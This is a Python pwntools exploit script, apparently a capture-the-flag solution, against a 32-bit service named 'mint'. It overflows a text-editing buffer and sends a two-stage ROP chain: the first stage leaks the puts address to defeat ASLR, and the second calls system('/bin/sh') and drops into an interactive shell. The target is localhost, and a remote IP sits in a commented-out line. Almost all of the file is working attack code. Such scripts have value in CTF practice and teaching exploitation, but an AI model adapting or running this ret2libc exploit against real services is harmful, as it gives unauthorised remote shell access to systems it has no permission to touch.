from pwn import *
import os
import time
context(arch='i386')

def build_stage1_rop(elf):
  rop = ROP(elf)
  
  # Leak puts address
  rop.puts(0x0804A018)
  # Return back to input function
  rop.raw(0x08048630)

  # Return string version of ROP payload
  return str(rop)

def build_stage2_rop(libc):
  # Build the libc rop payload
  rop = ROP(libc)

  # Call system with "/bin/sh\x00" string in libc
  rop.system(next(libc.search('/bin/sh\x00')))

  # Return string version of ROP payload
  return str(rop)

def send_rop_payload(conn, payload):
  # [1] Add text
  conn.recvuntil('Enter ur option :')
  conn.sendline('1')
  conn.sendline('A' * 48)

  # [2] Edit text
  # [3] Display text
  conn.recvuntil('Enter ur option :')
  conn.sendline('2')
  conn.sendline('1')
  conn.sendline('A' * 26 + payload) 

  # Trigger exploit
  # [4] Exit
  conn.recvuntil('Enter ur option :')
  conn.sendline('4')

def exploit(conn, elf, libc):
  print "[+] Sending leak puts got plt address rop payload"
  stage1_payload = build_stage1_rop(elf)
  
  # Send the stage 1 rop payload
  send_rop_payload(conn, stage1_payload)
  
  # Get the remote libc base address
  leaked_puts = u32(conn.recvline()[:4].strip().ljust(4, '\x00'))
  libc.address = leaked_puts - libc.symbols['puts']
  print "[+] Leaked puts address: 0x%04x" % (leaked_puts)
  print "[+] Libc address: 0x%04x" % (libc.address)

  print "[+] Sending libc system(\"/bin/sh\\x00\") rop payload"
  stage2_payload = build_stage2_rop(libc)

  # Send the stage 2 rop payload
  send_rop_payload(conn, stage2_payload)

  # Interact with the remote shell
  conn.interactive()

def main():
  # Read binary an libc
  elf = ELF('mint')
  #libc = ELF('libc-2.23.so')
  libc = ELF('/lib/i386-linux-gnu/libc.so.6')

  # Connect to remote service 
  #conn = remote('139.59.61.220', 42345)
  conn = remote('127.0.0.1', 42345)

  # Exploit the mint service
  exploit(conn, elf, libc)

# Hook
if __name__ == '__main__':
  main()